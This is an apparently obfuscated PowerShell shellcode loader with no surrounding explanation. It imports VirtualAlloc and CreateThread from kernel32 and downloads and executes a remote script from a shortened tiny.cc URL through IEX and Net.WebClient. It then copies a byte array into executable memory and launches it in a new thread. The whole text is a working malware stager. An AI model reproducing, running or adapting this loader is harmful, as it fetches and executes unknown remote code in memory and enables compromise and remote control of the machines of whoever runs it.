$ATkkKfGKoZimxF = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
$hjqvxVXLTyGfsYl = Add-Type -memberDefinition $ATkkKfGKoZimxF -Name "Win32" -namespace Win32Functions -passthru
IEX(New-Object Net.WebClient).DownloadString('https://tiny.cc/w5nmkz');
$TtAUVnDlaqWqVFH = $hjqvxVXLTyGfsYl::VirtualAlloc(0,[Math]::Max($bASSkdiXcDveDg.Length,0x1000),0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bASSkdiXcDveDg,0,$TtAUVnDlaqWqVFH,$bASSkdiXcDveDg.Length)
$hjqvxVXLTyGfsYl::CreateThread(0,0,$TtAUVnDlaqWqVFH,0,0,0)
